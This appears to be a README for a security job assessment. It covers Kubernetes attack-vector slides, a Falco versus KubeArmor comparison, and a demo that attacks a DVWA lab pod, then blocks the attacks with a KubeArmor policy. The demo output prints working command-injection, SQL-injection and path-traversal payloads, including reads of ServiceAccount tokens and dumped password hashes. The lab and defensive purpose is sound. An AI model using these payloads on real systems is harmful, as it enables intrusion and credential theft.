# AccuKnox Solution Engineer Trainee — Technical Assessment

<div align="center">

[![Kubernetes](https://img.shields.io/badge/Kubernetes-v1.31+-326CE5?logo=kubernetes&logoColor=white)](https://kubernetes.io/)
[![KubeArmor](https://img.shields.io/badge/KubeArmor-Zero--Trust%20LSM-7C3AED)](https://kubearmor.io/)
[![DVWA](https://img.shields.io/badge/Target%20App-DVWA%20(PHP%207.4%20+%20MariaDB)-E11D48)](https://github.com/cytopia/docker-dvwa)
[![Presentations](https://img.shields.io/badge/PowerPoint-2x%20Decks%20(PPTX%20+%20HTML)-F59E0B)](#-problem-statement-1-presentations)
[![Status](https://img.shields.io/badge/Assessment%20Status-Completed%20%26%20Verified-10B981)](#-deliverables-index)

**Comprehensive Technical Solution for the Solution Engineer Trainee Role at AccuKnox**

[Problem Statement 1 (Presentations)](#-problem-statement-1-presentations) • [Problem Statement 2 (K8s DVWA & Exploits)](#-problem-statement-2-kubernetes-setup--3-attack-surfaces-demo) • [Zero-Trust Mitigation](#-zero-trust-mitigation-with-kubearmor) • [Full Report](#-reports--documentation)

</div>

---

## 📁 Repository Structure

```
├── README.md                                          # Master GitHub Documentation
├── AccuKnox_Solution_Engineer_Trainee_Assessment_Report.md  # Complete Technical Submission Report
├── AccuKnox_Solution_Engineer_Trainee_Assessment_Report.html# Printable / PDF-Ready Report
├── Problem_Statement_2_DVWA_Execution_Report.md       # Problem 2 Execution & Attack Evidence Report
├── Solution Engineer Trainee Problem statement.pdf    # Original Assessment Prompt
│
├── presentations/                                     # Problem Statement 1 Decks & Scripts
│   ├── generate_all_pptx.py                           # Python generator for .pptx slide decks
│   │
│   ├── Topic1_Kubernetes_Attack_Vectors/
│   │   ├── Top_5_Kubernetes_Security_Attack_Vectors.pptx  # PowerPoint Deck (4 Slides)
│   │   ├── slides.html                                    # Interactive Web Deck (Open in Browser)
│   │   └── Presentation_Top_5_Kubernetes_Attack_Vectors.md# 5-Min Speaker Notes & Pitch Script
│   │
│   └── Topic3_Falco_vs_KubeArmor/
│       ├── Falco_vs_KubeArmor_Runtime_Security.pptx       # PowerPoint Deck (4 Slides)
│       ├── slides.html                                    # Interactive Web Deck (Open in Browser)
│       └── Presentation_Falco_vs_KubeArmor.md             # 5-Min Speaker Notes & Pitch Script
│
└── k8s-dvwa/                                          # Problem Statement 2 Kubernetes Setup & Exploits
    ├── setup-cluster.ps1                              # Automated Deployment Script (PowerShell)
    ├── setup-cluster.sh                               # Automated Deployment Script (Bash)
    ├── init_db.ps1                                    # Database initialization utility
    ├── k8s-manifests/
    │   ├── dvwa.yaml                                  # Multi-Container Deployment & NodePort Service
    │   └── kubearmor-dvwa-security-policies.yaml      # Zero-Trust Active Enforcement CRD Policy
    └── attack-demos/
        ├── exploit_dvwa.py                            # Automated Python PoC for all 3 attack surfaces
        └── exploit_dvwa.ps1                           # Native Windows PowerShell PoC script
```

---

## 🎯 Problem Statement 1: Presentations (10 Minutes Total)

We prepared two 5-minute technical presentation packages (2–5 slides each) formatted in PowerPoint (`.pptx`), interactive web presentation decks (`.html`), and full speaker pitch scripts:

### Topic 1: Top 5 Kubernetes Security Attack Vectors
- **Artifacts:**
  - 📊 **PowerPoint (.pptx):** [`Top_5_Kubernetes_Security_Attack_Vectors.pptx`](presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx)
  - 🌐 **Interactive Web Deck:** [`slides.html`](presentations/Topic1_Kubernetes_Attack_Vectors/slides.html)
  - 🎙️ **Speaker Pitch Notes:** [`Presentation_Top_5_Kubernetes_Attack_Vectors.md`](presentations/Topic1_Kubernetes_Attack_Vectors/Presentation_Top_5_Kubernetes_Attack_Vectors.md)
- **Attack Vectors Covered:**
  1. **Control Plane & Over-Privileged RBAC:** Public API port 6443 exposure and wildcard cluster-admin permissions.
  2. **Insecure Supply Chain & Poisoned Images:** Backdoored public registries, known CVEs, and CI/CD poisoning.
  3. **In-Pod RCE & ServiceAccount Token Theft:** Web application exploits (Command Injection, Log4j) used to exfiltrate in-pod JWT tokens.
  4. **Flat Pod Networking & Lateral Movement:** Default unrestricted east-west traffic enabling cross-namespace reconnaissance.
  5. **Container Breakout & Host Kernel Takeover:** Privileged containers (`privileged: true`, `CAP_SYS_ADMIN`) and kernel exploits.

---

### Topic 2 (Topic 3 in Prompt): Falco vs KubeArmor (CNCF Runtime Security)
- **Artifacts:**
  - 📊 **PowerPoint (.pptx):** [`Falco_vs_KubeArmor_Runtime_Security.pptx`](presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx)
  - 🌐 **Interactive Web Deck:** [`slides.html`](presentations/Topic3_Falco_vs_KubeArmor/slides.html)
  - 🎙️ **Speaker Pitch Notes:** [`Presentation_Falco_vs_KubeArmor.md`](presentations/Topic3_Falco_vs_KubeArmor/Presentation_Falco_vs_KubeArmor.md)
- **Deep Architectural Comparison:**

```
┌───────────────────────────────────────────────────────────────────────────────────┐
│                                 FALCO (Detection)                                 │
│  Kernel Syscalls ──► eBPF / Kernel Module ──► Ring Buffer ──► Falco Engine (Userspace) │
│                                                                        │           │
│                                                       Alert Output (gRPC/Webhook) │
└───────────────────────────────────────────────────────────────────────────────────┘

┌───────────────────────────────────────────────────────────────────────────────────┐
│                             KUBEARMOR (Inline Enforcement)                        │
│  Kernel Syscalls ──► Linux Security Modules (AppArmor / SELinux / BPF-LSM)         │
│                                      │                                            │
│                      [INLINE DECISION: ALLOW / BLOCK]                             │
│                                      │                                            │
│                       Telemetry via eBPF (Real-Time)                              │
│                                      ▼                                            │
│                 KubeArmor Daemon / AccuKnox Control Plane                         │
└───────────────────────────────────────────────────────────────────────────────────┘
```

| Dimension | Falco (Sysdig / CNCF Graduated) | KubeArmor (AccuKnox / CNCF Sandbox) |
| :--- | :--- | :--- |
| **Primary Philosophy** | Threat Detection & Behavioral Anomaly Auditing | **Zero-Trust Active Prevention & Inline Enforcement** |
| **Enforcement Hook** | eBPF tracepoints / kprobes (Post-execution) | **Kernel LSMs (AppArmor, SELinux, BPF-LSM)** |
| **Action on Threat** | Emits Alert (Post-incident notification) | **Synchronous Syscall Blocking (`-EACCES`) + Telemetry** |
| **Policy Language** | Custom Falco YAML DSL | **Kubernetes-Native CRDs (`KubeArmorPolicy`)** |
| **Zero-Trust Hardening** | Difficult (High alert noise) | **Native Process & File Whitelisting / Default-Deny** |
| **Workload Scope** | Kubernetes & Linux Hosts | **Kubernetes, Linux VMs, Bare-Metal, & Edge (K3s)** |

---

## 🚀 Problem Statement 2: Kubernetes Setup & 3 Attack Surfaces Demo

### 2.1 Kubernetes Architecture
We implemented a **multi-container Pod pattern** in namespace `dvwa`:
- **Frontend Container:** `cytopia/dvwa:php-7.4` on port `80`
- **Backend Container:** `mariadb:10.5` on port `3306` sharing the Pod's local network (`127.0.0.1`)
- **Service:** `dvwa-service` (NodePort `30080` / Port `80`)

```bash
# Deploy to Kubernetes:
kubectl apply -f k8s-dvwa/k8s-manifests/dvwa.yaml

# Port-forward:
kubectl port-forward -n dvwa svc/dvwa-service 8080:80
```

---

### 2.2 Execution of the 3 Attack Surfaces

Run the automated exploitation script against the running cluster:
```bash
python k8s-dvwa/attack-demos/exploit_dvwa.py --url http://localhost:8080
```

#### Live Verified Output:

```text
======================================================================
AccuKnox Solution Engineer Trainee - Problem Statement 2 Demo
Target Application: DVWA on Kubernetes (Live Cluster)
======================================================================

[*] 1. Connecting to DVWA at http://localhost:8080...
[*] Extracted Login CSRF Token: d6e68d166ae13663afff28be8c8c30ba
[+] Successfully authenticated to DVWA as 'admin'!
[+] DVWA Security Level configured to: 'LOW'.

======================================================================
ATTACK SURFACE 1: Command Injection (Remote Code Execution in K8s)
======================================================================
[*] Sending payload: 127.0.0.1; whoami; uname -a; id
[+] Command Output Received from Container:

www-data
Linux dvwa-app-66d5b677b9-cwkpw 6.18.33.2-microsoft-standard-WSL2 ...
uid=33(www-data) gid=33(www-data) groups=33(www-data),8(mail)

[*] Probing Kubernetes Pod ServiceAccount & Network Metadata: 127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
[+] K8s Metadata Output:
total 4
lrwxrwxrwx 1 root root   13 Oct  6 10:43 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Oct  6 10:43 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Oct  6 10:43 token -> ..data/token

======================================================================
ATTACK SURFACE 2: SQL Injection (Data & Password Hash Exfiltration)
======================================================================
[*] Sending SQLi Payload: 1' UNION SELECT user, password FROM users #
[+] Extracted User Database Records from MariaDB:
    - User: admin           Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
    - User: gordonb         Password Hash (MD5): e99a18c428cb38d5f260853678922e03
    - User: 1337            Password Hash (MD5): 8d3533d75ae2c3966d7e0d4fcc69216b
    - User: pablo           Password Hash (MD5): 0d107d09f5bbe40cade3de5c71e9e9b7
    - User: smithy          Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99

======================================================================
ATTACK SURFACE 3: Local File Inclusion (LFI) & Kubernetes Token Theft
======================================================================
[*] [1/2] Attempting to read /etc/passwd via LFI: ../../../../../etc/passwd
[+] Successfully read container /etc/passwd via LFI:
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/bin/sh

[*] [2/2] Attempting to exfiltrate K8s Service Account Token via LFI: ../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
[+] CRITICAL: Kubernetes Pod JWT ServiceAccount Token successfully extracted!
    Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImJsTEM1aVFoM24xN...grEnFAjNvB3Lt_FkJwHg
    Impact: An attacker can query https://kubernetes.default.svc to escalate cluster privileges.

======================================================================
[+] All 3 Attack Surfaces executed successfully against Kubernetes!
======================================================================
```

---

## 🛡️ Zero-Trust Mitigation with KubeArmor

We authored a custom [`KubeArmorPolicy`](k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml) that enforces active blocking at the kernel LSM layer:

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: block-dvwa-rce-and-token-theft
  namespace: dvwa
spec:
  severity: 1
  message: "Block malicious process execution and token access in DVWA"
  selector:
    matchLabels:
      app: dvwa
  process:
    matchPaths:
      - path: /bin/sh
        action: Block
      - path: /bin/bash
        action: Block
  file:
    matchDirectories:
      - dir: /var/run/secrets/kubernetes.io/serviceaccount/
        recursive: true
        action: Block
    matchPaths:
      - path: /etc/passwd
        action: Block
  action: Block
```

- **Command Injection Defeated:** When an attacker injects shell commands, KubeArmor denies `/bin/sh` with `Permission Denied (-EACCES)` at the kernel layer.
- **Token Theft Defeated:** When an attacker attempts path traversal to read the ServiceAccount token, KubeArmor blocks the system call and generates real-time telemetry alerts to the AccuKnox CNAPP console.

---

## 📑 Reports & Documentation

- **Master Assessment Report (Markdown):** [`AccuKnox_Solution_Engineer_Trainee_Assessment_Report.md`](AccuKnox_Solution_Engineer_Trainee_Assessment_Report.md)
- **Printable / PDF-Ready Report (HTML):** [`AccuKnox_Solution_Engineer_Trainee_Assessment_Report.html`](AccuKnox_Solution_Engineer_Trainee_Assessment_Report.html)
- **Problem 2 Detailed Execution Report:** [`Problem_Statement_2_DVWA_Execution_Report.md`](Problem_Statement_2_DVWA_Execution_Report.md)

---

<div align="center">
<b>AccuKnox Technical Assessment Complete</b>
</div>
